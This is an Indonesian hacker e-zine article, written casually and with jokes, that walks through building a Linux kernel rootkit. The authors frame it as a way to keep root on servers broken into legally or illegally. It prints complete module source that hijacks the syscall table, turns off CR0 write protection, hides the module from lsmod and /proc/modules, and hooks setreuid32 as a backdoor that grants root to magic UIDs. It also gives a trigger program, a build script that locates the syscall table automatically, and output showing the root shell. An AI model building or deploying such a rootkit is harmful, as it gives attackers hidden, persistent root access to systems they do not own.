@@ -1,0 +1,684 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXV, PHILE 0x09.TXT
+__________       ______  __       __________________               
+___  ____/__________  / / /______ ____  /___  /___(_)_______ _____ 
+__  __/   _  ___/__  /_/ / _  __ \___  / __  / __  / __  __ \_  _ \
+_  /___   / /__  _  __  /  / /_/ /__  /  _  /___  /  _  / / //  __/
+/_____/   \___/  /_/ /_/   \____/ _  /   /____//_/   /_/ /_/ \___/ 
+                                  /_/
+  ROOTKIT: Renyah, Enak, dan Gurih
+  dextone & stnmrshx
+
+-----[ Introduction
+
+Jadi begini ceritanya pembaca yang budiman dan budiwati tercinta, pada kali ini
+saya mau berbagi sedikit yang saya bisa biarpun masih amatiran begini yang
+penting bagi-bagi gitu. Nah, saya yakin banyak diantara pembaca yang budiman
+dan budiwati ini sudah ndak asing dan bahkan mungkin saja sudah biasa keluar
+masuk server baik legal maupun ilegal bahkan sampe dapet akses root bermodalkan
+local exploit atau remote exploit yang dibagi-bagi atau bisa juga 0day sendiri.
+
+Pada tahapan setelah ngeroot itu biasanya sebisa mungkin akses priviledge yang
+sudah didapat (root) pokoknya gimanapun caranya kudu dipertahankan. Disinilah
+mungkin banyak para pembaca yang budiman dan budiwati ini yang memakai rootkit,
+buat jaga-jaga sapa tau password rootnya diganti dan anda sekalian masih bisa
+ongkang-ongkang dapet akses rootnya soalnya sudah di backdoor.
+
+Beberapa rootkit yang banyak beredar sudah mumpuni dan woyo, dan pada
+kesempatan ini saya mau bagi sedikit rootkit maha bosok saya yang ndak seberapa
+ini, dan bagaimana cara membuatnya berdasarkan weton serta fengshui.
+
+-----[ Syscall Hijack
+
+Sebelum memulainya ada baiknya membaca doa sesuai keyakinan masing-masing biar
+diridhoi dan dijauhkan dari kesialan. Dan sekedar info saya PoC (Piye om
+Carane) ini di linux kernel 2.6.38, belum ada kesempatan nyoba di kernel kepala
+3.x.x jadi kalo ndak jalan ya maklum namanya juga rootkit maha bosok.
+
+Metode penanaman rootkit ada beberapa cara, umumnya biasanya menggunakan metode
+memperkosa syscall. Syscall itu sendiri adalah mekanisme dan aturan bagaimana
+sebuah program merequest service dari inti sistem operasi yang dalam hal ini
+adalah kernel, service yang dipegang ini bisa berupa hal-hal yang berhubungan
+dengan hardware komputer, create dan execute proses, dan berkomunikasi (nyepik)
+dengan internal kernel. Wooogh ndak perlu buru-buru ruwet, ini istilahnya cuma
+nyepikin kernel, kalo anda sekalian sudah biasa nyepikin cewek/cowok maka ndak
+jauh bedalah, ndak wow kk wow kok, simpel sebenernya.
+
+Nah metode memperkosa syscall ini atau bahasa kerennya hijacking syscall
+biasanya menggunakan skenario seperti ini : 
+    1. Mengakses syscall table
+    2. Bypass Kernel Write Protection
+    3. Bypass CR0 Protection
+    4. Hiding Kernel Module
+
+Skenario diatas untungnya disediakan semua sama kernelnya, baek bener khan si
+kernel ini. Beda dengan syscall proxying, atau GDT Hooking yang maha njelimet,
+karena keterbatasan isi kepala saya maka saya pilih saja ini syscall hijack
+selain karena murah dan aman, juga lebih manusiawi.
+
+Kita mulai masuk kedalam skenario mengakses syscall tablenya. Ada banyak cara
+yang dapat digunakan untuk mengetahui memory address syscall table. Yang paling
+mudah adalah mencarinya langsung di dalam "System.map" yang ada di direktori
+/boot.
+
+Ex.
+stnmrshx@monyet:~$ sudo cat /boot/System.map-2.6.38-13-generic
+...
+c19175c4 b br_ioctl_hook
+c19175c8 b vlan_ioctl_hook
+c19175cc b dlci_ioctl_hook
+c19175d0 b warned.41013
+c1917600 b proto_inuse_idx
+...
+stnmrshx@monyet:~$
+
+Nah banyak bener khan, itu semua symbol dan address yang digunakan oleh kernel
+untuk mengatur dan memetakan keseluruhan sistem operasi. Yang kita butuhkan
+cuma mengetahui memory address syscall table di dalam System.map jadi cukup
+begini aja :
+
+Ex.
+stnmrshx@monyet:~$ sudo cat /boot/System.map-2.6.38-13-generic | grep sys_call_table
+c1513160 R sys_call_table
+stnmrshx@monyet:~$ 
+
+Nah nongol deh, berarti alamat memory address nya syscall table itu berada di
+c1513160, catet bro en sis.
+
+Skenario pertama sakses, selanjutnya skenario kedua yaitu Bypass Kernel Write
+Protection. Ibaratnya nyepik atau ngedeketin cewek/cowok gebetan ini bisa
+disamakan dengan ngedeketin temen gebetan anda sekalian gitu biar aksesnya
+mudah. Dan biasanya lagi temen gebetan anda bakalan ngasih akses alias
+memudahkan jalan anda khan. Begitu juga dengan kernel ini, dia ngasih jalan kok
+yaitu dengan dua task function spesialnya itu :
+
+void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xaddress_pages_rw;
+void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xaddress_pages_ro;
+
+Task Function yang menggunakan address_pages_rw ini punya kemampuan untuk
+mengeset "write mode" atau kemampuan menulis kernel page berdasarkan argumen,
+sedangkan yang menggunakan address_pages_ro punya kemampuan untuk mengeset
+"read mode" kernel page berdasarkan argumen yang diberikan. Namun, untuk itu
+kita (kita??? elo aja kali sama temen-temen elo yang pangky-pangky) perlu
+mengetahui dan mendayagunakan virtual address dari page yang bakalan kita
+obok-obok tersebut. Dalam hal ini kernel pun berbaik hati memberikan satu
+function lagi yang bisa kita gunakan yaitu "virt_to_page()" function yang
+fungsinya mengkonversi virtual address dari page yang berkaitan dengan physical
+page memory yang disediakan kernel. Ruwet? Ya sudah ndak apa-apa saya juga
+ruwet kok ahahahaha. Nah untuk mengetahui alamat pages_rw dan pages_ro nya bisa
+diketahui dengan menggunakan cara yang sama kayak yang pertama tadi cuma beda
+tipis aja :
+
+stnmrshx@monyet:~$ sudo cat /boot/System.map-2.6.38-13-generic | grep -e pages_rw -e pages_ro
+c10308b0 T set_pages_ro
+c10308d0 T set_pages_rw
+stnmrshx@monyet:~$
+
+Oke dapet khan alamatnya pages_ro dan pages_rw nya, jadi lengkapnya functionnya
+kayak gini setelah alamatnya disisipkan :
+
+void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc10308d0;
+void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc10308b0;
+
+Syiiip, sudah siyap nih jadinya kita, saya, dan anda para pembaca budiman dan
+budiwati bisa mengakses dan memodifikasi syscall table dengan cara ini :
+
+-----*snip*------
+| ...
+| 
+| unsigned long *syscall_table = (unsigned long *)0xc1513160; //alamat memory address syscall table 
+| 
+| void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc10308d0; //address pages_rw
+| void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc10308b0; //address pages_ro
+| 
+| static int init(void)
+| {
+| 
+|    struct page *_sys_call_page;
+|    printk(KERN_ALERT "\nMODIF INIT\n");
+|
+|    _sys_call_page = virt_to_page(&syscall_table); //konversi pake virt_to_page
+|
+|    pages_rw(_sys_call_page, 1);
+|
+|    ...
+|}
+-----*snip*------
+
+Nah skenario Bypass kernel write protection sudah selesai. Lanjut ke Bypass cr0
+Protectionnya. Sekedar informasi dan biar ndak dianggap HOAX, beberapa CPU
+menerapkan 0-bit di CR atau Control Register ini diset dalam keadaan 0 yang
+artinya secara default dalam keadaan protected mode aktif. CR0 ini
+sepengetahuan saya yang ndak seberapa ini ada pada CPU yang berarsitektur x86,
+untuk yang x64 kurang tau deh saya ndak sempet ngecek. Dan untuk yang pake
+Virtual CPU (kayak VPS dan kawan-kawannya) juga ndak ada CR0, sepengetahuan
+saya loooh, kalo salah ya mohon diralat mwach mwach :*
+
+Untuk mengetahui apakah CPU nya secara default dalam keadaan protected mode
+aktif bisa diketahui dengan cara seperti ini :
+
+Ex.
+stnmrshx@monyet:~$ cat /proc/cpuinfo | grep wp
+wp		: yes
+wp		: yes
+stnmrshx@monyet:~$ 
+
+Woooogh kata nya "yes" berarti CPU saya defaultnya protected mode aktif. Nah
+beruntungnya kernel memberikan akses untuk kita bypass cr0 protectionnya (ihk
+baek banget sih kernel ini ciyum loh :-*) yaitu dengan dua function juga :
+
+static inline unsigned long native_read_cr0 (void)
+{
+         unsigned long val;
+         asm volatile("movl %%cr0,%0\n\t" :"=r" (val));
+         return val;
+}
+
+static inline void native_write_cr0 (unsigned long val)
+{
+         asm volatile("movl %0,%%cr0": :"r" (val));
+} 
+
+
+Function read_cr0 memberikan nilai dari register CR0nya, sedangkan function
+write_cr0 mengeset bit dari registernya berdasarkan nilai yang ditentukan oleh
+parameter. Jadi sekarang kita bisa mengaktifkan dan nonaktifkan protected mode
+dengan cara seperti ini :
+
+write_cr0 (read_cr0 () & (~ 0x10000)); //disable protected mode
+
+write_cr0 (read_cr0 () | 0x10000); //enable protected mode
+
+Bypass CR0 Protection sudah berarti tinggal skenario yang terakhir ini, yaitu
+menyembunyikan nya dari lsmod dan /proc/modules. Kalau rkhunter atau chkrootkit
+saya ndak ngetes, paling-paling ya ketahuan soalnya ini khan sederhananya saja
+gitu.
+
+Untuk Hiding Kernel Module ini  dengan cara mudah yaitu dengan menambahkan
+baris function ini :
+
+static int init(void) {
+
+    list_del_init(&__this_module.list);
+
+    return 0;
+}
+
+static void exit(void) {
+
+    return;
+}
+
+Kok bisa? ya bisa dong soalnya function list_del_init() itu didefinisikan begini :
+
+static inline void list_del_init (struct list_head * entry)
+{
+	 __list_del (entry->prev, entry->next);
+	 INIT_LIST_HEAD (entry);
+}
+
+Dan ditempat lainnya __list_del() dan INIT_LIST_HEAD() function didefinisikan
+kayak begini :
+
+static inline void __list_del (struct list_head * prev, struct list_head * next)
+{
+	 next-> prev = prev;
+	 prev-> next = next;
+}
+
+static inline void INIT_LIST_HEAD (struct list_head * list)
+{
+	 list-> next = list;
+	 list-> prev = list;
+}
+
+Jadi function list_del_init() menghilangkan nama dari module yang di link
+ganda, sehinggaaaaa dengan cara ini module nya ndak kebaca di lsmod dan
+/proc/modules.
+
+Simpel khan, ya jangan dibandingin mas dan mbak sama rootkit peropesional yang
+banyak beredar diluar sana, maklum ini mah simpel saja kok.  
+
+Nah berarti lengkapnya sekerip yang dibuat jadinya seperti ini setelah
+digabungkan dengan bypass kernel write protection, bypass cr0 protection dan
+hiding process jadinya begini :
+
+-----*snip*-----
+| #include <linux/init.h>
+| #include <linux/module.h>
+| #include <linux/kernel.h> 
+| #include <linux/errno.h> 
+| #include <linux/types.h>
+| #include <linux/unistd.h>
+| #include <asm/cacheflush.h>  
+| #include <asm/page.h>  
+| #include <asm/current.h>
+| #include <linux/sched.h>
+| #include <linux/kallsyms.h>
+| 
+| unsigned long *syscall_table = (unsigned long *)0xc1513160; //alamat syscall table
+| asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
+| asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
+| 	printk(KERN_ALERT "WRITE HIJACKED");
+| 	return (*original_write)(fd, buf, count);
+| }
+|
+| static int init(void) {
+| 	list_del_init(&__this_module.list); // hiding process
+| 	printk(KERN_ALERT "\nHIJACK INIT\n");
+|	write_cr0 (read_cr0 () & (~ 0x10000));
+|	original_write = (void *)syscall_table[__NR_write];
+| 	syscall_table[__NR_write] = new_write;  
+| 	write_cr0 (read_cr0 () | 0x10000);
+| 	return 0;
+| }
+| 
+| static void exit(void) {
+|	write_cr0 (read_cr0 () & (~ 0x10000));
+| 	syscall_table[__NR_write] = original_write;  
+| 	write_cr0 (read_cr0 () | 0x10000);
+| 	printk(KERN_ALERT "MODULE EXIT\n");
+| 	return;
+| }
+| 
+| module_init(init);
+| module_exit(exit);
+|
+----*snip*----
+
+Sekarang dicoba mas bero, save as "testbero.c" terus bikin Makefilenya :
+
+----*snip*----
+
+obj-m	:= testbero.o
+
+KDIR    := /lib/modules/$(shell uname -r)/build
+PWD    := $(shell pwd)
+
+default:
+	$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+----*snip*----- 
+
+Daaaan kita coba yes :)
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ ls
+Makefile  testbero.c
+stnmrshx@monyet:~/Desktop/simplarootkit$ make
+make -C /lib/modules/2.6.38-13-generic/build SUBDIRS=/home/stnmrshx/Desktop/simplarootkit modules
+make[1]: Entering directory `/usr/src/linux-headers-2.6.38-13-generic'
+  CC [M]  /home/stnmrshx/Desktop/simplarootkit/testbero.o
+/home/stnmrshx/Desktop/simplarootkit/testbero.c: In function ‘init’:
+/home/stnmrshx/Desktop/simplarootkit/testbero.c:25:28: warning: assignment makes integer from pointer without a cast
+/home/stnmrshx/Desktop/simplarootkit/testbero.c: In function ‘exit’:
+/home/stnmrshx/Desktop/simplarootkit/testbero.c:32:28: warning: assignment makes integer from pointer without a cast
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/stnmrshx/Desktop/simplarootkit/testbero.mod.o
+  LD [M]  /home/stnmrshx/Desktop/simplarootkit/testbero.ko
+make[1]: Leaving directory `/usr/src/linux-headers-2.6.38-13-generic'
+stnmrshx@monyet:~/Desktop/simplarootkit$ sudo insmod testbero.ko
+stnmrshx@monyet:~/Desktop/simplarootkit$
+stnmrshx@monyet:~/Desktop/simplarootkit$ lsmod | grep testbero
+stnmrshx@monyet:~/Desktop/simplarootkit$
+stnmrshx@monyet:~/Desktop/simplarootkit$ cat /proc/modules | grep testbero
+stnmrshx@monyet:~/Desktop/simplarootkit$
+
+Uyeeeee gak ketauan. Nah berarti dasar-dasar syscall hijackingnya sudah bisa
+khan. Sekarang mulai masuk ke dalam rootkitnya.
+
+-----[ Mari Merakit Biar Maknyos
+
+Pertama-tama yang perlu di pahami adalah proses rootkit yang maha bosok ini
+menggunakan metode "mengganti proses credential menggunakan kernel module".
+Untuk itu perlu kiranya kita mengetahui informasi apa saja yang ada di dalam
+task_struct dan bagaimana cara mengakses proses credentialnya biar yang dari
+user biasa jadi root setelah trigerring dan execute rootkitnya. Seluruh proses
+credential dan cara kerja serta bagaimana mengaksesnya terdapat di source
+kernel linux/cred.h dan bisa dilihat sendiri mau lewat gitweb atau lewat
+/usr/src/ kernel anda sendiri. Struktur cred yang didefinisikan didalam
+linux/cred.h ini antara lain adalah :
+
+struct cred {
+	...
+	uid_t		uid;		/* real UID of the task */
+	gid_t		gid;		/* real GID of the task */
+	uid_t		suid;		/* saved UID of the task */
+	gid_t		sgid;		/* saved GID of the task */
+	uid_t		euid;		/* effective UID of the task */
+	gid_t		egid;		/* effective GID of the task */
+	uid_t		fsuid;		/* UID for VFS ops */
+	gid_t		fsgid;		/* GID for VFS ops */
+	...
+
+Dengan define cred yang seperti itu kita dapat memodifikasi proses
+credentialnya dengan cara seperti ini :
+
+----*snip*----
+|
+| struct cred *new;
+| new = prepare_creds();
+| if ( new != NULL )
+| {
+| 	new->uid = new->gid = 0;
+| 	new->euid = new->egid = 0;
+| 	new->suid = new->sgid = 0;
+| 	new->fsuid = new->fsgid = 0;
+| 	commit_creds(new);
+| }
+|
+----*snip*----
+
+Nah sekarang penjelasannya, function prepare_creds() ini mengunci proses
+current->cred_replace_mutex dan kemudian mengalokasikan serta membangun
+duplikat dari proses credential yang sedang berjalan. Proses credentials yang
+sedang berjalan tersebut kemudian dikembalikan lagi dengan posisi mutex yang
+masih terkunci jika berhasil. Dan nilainya akan menjadi NULL jika proses
+pengembaliannya tidak berhasil.
+
+Sedangkan function commit_creds() ini akan mengubah beberapa aspek yang
+digunakan oleh proses credential dan kemudian akan menggunakan function
+rcu_assign_pointer untuk kemudian menggantikan credentials yang baru menjadi
+current->cred. Function ini akan membuka current->cred_replace_mutex yang
+tadinya dikunci dan memberikan akses ptrace() untuk mengambil posisi dan
+terakhir menotifikasi scheduler di kernel jika terjadi perubahan.
+
+Bingung ya? Buat lebih jelasnya bisa baca disini
+http://www.mjmwired.net/kernel/Documentation/credentials.txt yang memuat
+perubahan credentialsnya.
+
+Jadi, kita sudah mendapatkan cukup informasi untuk membuat rootkit kita.
+Rootkit maha bosok kita ini akan memberikan akses root credentials jika kita
+meminta shell dengan misalnya RUID == 7130 dan EUID == 0317. Yang perlu kita
+lakukan adalah cukup dengan membajak syscall table __NR_setreuid32 kemudian
+mengecek RUID dan EUID nya. 
+
+Nah jadi semua dependensi sudah terpenuhi khan, alamat syscall table sudah
+didapat, bypass kernel write protection sudah, bypass cr0 protected sudah, dan
+hiding sudah. Sekarang dengan menambah task_struct baru untuk mengeset
+credentials nya maka rootkit maha bosok kita akan jadi seperti ini :
+
+-----*snip*-----
+| stnmrshx@monyet:~/Desktop/simplarootkit$ cat mahabosok.c
+| 
+| #include <linux/init.h>
+| #include <linux/module.h>
+| #include <linux/kernel.h>
+| #include <linux/errno.h>
+| #include <linux/version.h>
+| #include <linux/types.h>
+| #include <linux/unistd.h>
+| #include <asm/cacheflush.h>
+| #include <asm/page.h>
+| #include <linux/sched.h>
+| #include <linux/kallsyms.h>
+|
+| unsigned long *syscall_table = (unsigned long *)0xc1513160; //alamat syscall table
+| asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);
+| asmlinkage int new_setreuid (uid_t ruid, uid_t euid)
+| {
+| 	struct cred *new;
+| 	if ((ruid == 7130) && (euid == 0317)) //contoh ruid sama euidnya saja
+| 	{
+| 		printk(KERN_ALERT "[Valid] \n");
+| 
+| 		new = prepare_creds();
+| 		if ( new != NULL )
+| 		{
+| 			new->uid = new->gid = 0;
+| 			new->euid = new->egid = 0;
+| 			new->suid = new->sgid = 0;
+| 			new->fsuid = new->fsgid = 0;
+| 			commit_creds(new);
+| 		}
+| 		return orig_setreuid (0, 0);
+| 	}
+| 	return orig_setreuid (ruid, euid);
+| }
+| 
+| static int init(void)
+| {
+| 	list_del_init(&__this_module.list); // hiding process
+|	printk(KERN_ALERT "\nHIJACK INIT\n");
+|	write_cr0 (read_cr0 () & (~ 0x10000));
+|	orig_setreuid = syscall_table [__NR_setreuid32];
+|	syscall_table [__NR_setreuid32] = new_setreuid;
+|	write_cr0 (read_cr0 () | 0x10000);
+|	return 0;
+| }
+|
+| static void exit(void)
+| {
+|	write_cr0 (read_cr0 () & (~ 0x10000));
+|	syscall_table[__NR_setreuid32] = orig_setreuid;
+|	write_cr0 (read_cr0 () | 0x10000);
+|	printk(KERN_ALERT "MODULE EXIT\n");
+|	return;
+| }
+|
+| module_init(init);
+| module_exit(exit);
+|
+----*snip*----
+
+----*snip*----
+stnmrshx@monyet:~/Desktop/simplarootkit$ cat Makefile
+
+obj-m	:= mahabosok.o
+
+KDIR    := /lib/modules/$(shell uname -r)/build
+PWD    := $(shell pwd)
+
+default:
+	$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+----*snip*----
+
+----*snip*----
+| stnmrshx@monyet:~/Desktop/simplarootkit$ cat colok.c
+|
+| #include <stdio.h>
+| int main ()
+| {
+|	setreuid (7130, 0317);
+|	system ("/bin/sh");
+|	return 0;
+| }
+|
+----*snip*----
+
+Compile dulu modulenya pake Makefile :
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ make
+make -C /lib/modules/2.6.38-13-generic/build SUBDIRS=/home/stnmrshx/Desktop/simplarootkit modules
+make[1]: Entering directory `/usr/src/linux-headers-2.6.38-13-generic'
+  CC [M]  /home/stnmrshx/Desktop/simplarootkit/mahabosok.o
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c: In function ‘init’:
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:41:16: warning: assignment makes pointer from integer without a cast
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:42:34: warning: assignment makes integer from pointer without a cast
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c: In function ‘exit’:
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:50:33: warning: assignment makes integer from pointer without a cast
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/stnmrshx/Desktop/simplarootkit/mahabosok.mod.o
+  LD [M]  /home/stnmrshx/Desktop/simplarootkit/mahabosok.ko
+make[1]: Leaving directory `/usr/src/linux-headers-2.6.38-13-generic'
+stnmrshx@monyet:~/Desktop/simplarootkit$
+
+Kemudian pasang rootkitnya :
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ sudo insmod mahabosok.ko
+stnmrshx@monyet:~/Desktop/simplarootkit$
+
+Cek dulu apa sudah hiding atau belum itu rootkit maha bosoknya :
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ lsmod | grep mahabosok
+stnmrshx@monyet:~/Desktop/simplarootkit$
+
+Sip dan terakhir compile trigger buat executenya :
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ gcc colok.c -o colok
+
+Dan Eksekusi juragan!!!
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ ./colok
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),46(plugdev),112(lpadmin),120(admin),122(sambashare),1000(stnmrshx)
+#
+# whoami
+root
+#
+
+Sip berjalan sakses deh rootkitnya, jadi andaikata password rootnya diganti
+atau lupa ya gpp, selama rootkitnya tetep kepasang masih bisa diakses.
+
+-----[ Dynamic Syscall Table
+
+Nah ternyata ada pertanyaan kayak gini nih. Bisa nggak sih kita dapetin memory
+address syscall table secara dinamik? Mungkin saja kalo di komputer saya yang
+bosok juga ini kecatetnya c1513160 dan di komputer lain bisa jadi c1512130,
+kalo beda khan susaaa paaaaaaak. Otentu bisa para pembaca yang budiman dan
+budiwati. Seperti yang saya bilang diawal-awal paper ini, ada banyak cara untuk
+mengetahui memory address syscall table, yang saya contohin pertama diatas itu
+cuma satu contoh simpel saja. Nah cara yang agak simpel lainnya untuk mencari
+memory address syscall table secara dinamik bisa dengan menggunakan fitur shell
+yang sederhana seperti ini : 
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ sudo grep sys_call_table /boot/System.map-$(uname -r) | awk '{print $1}'
+c1513160
+stnmrshx@monyet:~/Desktop/simplarootkit$ 
+
+Sehingga yang perlu dilakukan adalah dengan membuat sebuah file bash executable
+(compile.sh) yang memiliki tugas :
+    1. mencari memory address syscall table.
+    2. memasukkannya kedalam source rootkit maha bosok kita.
+    3. menjalankan Makefile
+
+Jadi kayak begini deh...
+
+----*snip*----
+|
+| #!/bin/bash
+|
+| ADDRESNYO=$(grep sys_call_table /boot/System.map-$(uname -r) |awk '{print $1}')
+| sed -i s/ADDRESNYO/$ADDRESNYO/g mahabosok.c
+|
+| make
+|
+----*snip*----
+
+Dan untuk mahabosok.c nya diubah dikit aja pas bagian memory address syscall
+table nya :
+
+----*snip*----
+|
+| #include <linux/init.h>
+| #include <linux/module.h>
+| #include <linux/kernel.h>
+| #include <linux/errno.h>
+| #include <linux/version.h>
+| #include <linux/types.h>
+| #include <linux/unistd.h>
+| #include <asm/cacheflush.h>
+| #include <asm/page.h>
+| #include <linux/sched.h>
+| #include <linux/kallsyms.h>
+|
+| unsigned long *syscall_table = (unsigned long *)0xADDRESSNYO; //alamat syscall table addressnyo
+| asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);
+| asmlinkage int new_setreuid (uid_t ruid, uid_t euid)
+| {
+|	struct cred *new;
+|	if ((ruid == 7130) && (euid == 0317)) //contoh ruid sama euidnya saja
+|	{
+|		printk(KERN_ALERT "[Valid] \n");
+|
+|		new = prepare_creds();
+|		if ( new != NULL )
+|		{
+|			new->uid = new->gid = 0;
+|			new->euid = new->egid = 0;
+|			new->suid = new->sgid = 0;
+|			new->fsuid = new->fsgid = 0;
+|			commit_creds(new);
+|		}
+|		return orig_setreuid (0, 0);
+|	}
+|	return orig_setreuid (ruid, euid);
+| }
+|
+| static int init(void)
+| {
+|	list_del_init(&__this_module.list); // hiding process
+|	printk(KERN_ALERT "\nHIJACK INIT\n");
+|	write_cr0 (read_cr0 () & (~ 0x10000));
+|	orig_setreuid = syscall_table [__NR_setreuid32];
+|	syscall_table [__NR_setreuid32] = new_setreuid;
+|	write_cr0 (read_cr0 () | 0x10000);
+|	return 0;
+| }
+|
+| static void exit(void)
+| {
+| 	write_cr0 (read_cr0 () & (~ 0x10000));
+|	syscall_table[__NR_setreuid32] = orig_setreuid;
+|	write_cr0 (read_cr0 () | 0x10000);
+|	printk(KERN_ALERT "MODULE EXIT\n");
+|	return;
+| }
+|
+| module_init(init);
+| module_exit(exit);
+|
+----*snip*----
+
+Kita jalanin yuk biar bertambah 70% ketampanan kita semua ihik X))
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ ./compile.sh
+make -C /lib/modules/2.6.38-13-generic/build SUBDIRS=/home/stnmrshx/Desktop/simplarootkit modules
+make[1]: Entering directory `/usr/src/linux-headers-2.6.38-13-generic'
+  CC [M]  /home/stnmrshx/Desktop/simplarootkit/mahabosok.o
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c: In function ‘init’:
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:41:16: warning: assignment makes pointer from integer without a cast
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:42:34: warning: assignment makes integer from pointer without a cast
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c: In function ‘exit’:
+/home/stnmrshx/Desktop/simplarootkit/mahabosok.c:50:33: warning: assignment makes integer from pointer without a cast
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /home/stnmrshx/Desktop/simplarootkit/mahabosok.mod.o
+  LD [M]  /home/stnmrshx/Desktop/simplarootkit/mahabosok.ko
+make[1]: Leaving directory `/usr/src/linux-headers-2.6.38-13-generic'
+stnmrshx@monyet:~/Desktop/simplarootkit$ 
+
+Dengan menggunakan fitur sed kita mengganti nilai ADDRESSNYO secara otomatis
+pada saat compiling module mahabosoknya. Kalau di grep file mahabosok.c nya pun
+jadi berubah kayak gini memory addressnya :
+
+stnmrshx@monyet:~/Desktop/simplarootkit$ cat mahabosok.c | grep *syscall_table
+unsigned long *syscall_table = (unsigned long *)0xc1513160; //alamat syscall table
+stnmrshx@monyet:~/Desktop/simplarootkit$
+
+Cara diatas bisa dikatakan cara yang mudah sekali dan efisien mantep dan
+sebagainya. Ada banyak mungkin cara yang dapat digunakan, tapi karena
+keterbatasan waktu dan mepetnya deadline saya rasa ini saja cukup.
+
+-----[ Penutup
+
+Hnaaah dengan begini sudah jadilah kernel rootkit kita yang maha bosok dan maha
+sederhana ini. Harap maklum yes kalo rootkitnya ndak keren ndak bisa jalan di
+trotoar, namanya juga saya masih amatiran, cuma kepingin berbagi sajah ihik
+ihik X)). Dan saya ndak bisa  
+
+Baiklah pembaca yang budiman dan budiwati, telah tiba kita pada bagian yang
+paling akhir. Semoga isi tulisan ini bisa membuat para pembaca budiman dan
+budiwati terhibur dan terangsang. Jikalau ada kesalahan, harap maklum namanya
+juga masih amatiran, mwach mwach ciyum buat semuwaaa :-*
+
+SHOUTS : semuwanyaaaa mwach mwach kecup kecup dari kami untuk kaliaaaan :*
+
+-----[ Reference
+
+[1] "Credentials in Linux", David Howells, http://www.mjmwired.net/kernel/Documentation/credentials.txt
+[2] "Protected Mode", http://en.wikipedia.org/wiki/Protected_mode
+[3] "System Call Redirection 2.6 Kernel Code That Works", jcochett, http://kerneltrap.org/node/6416
+
+**source sudah di papernya, jadi ndak perlu di lampirken yes**
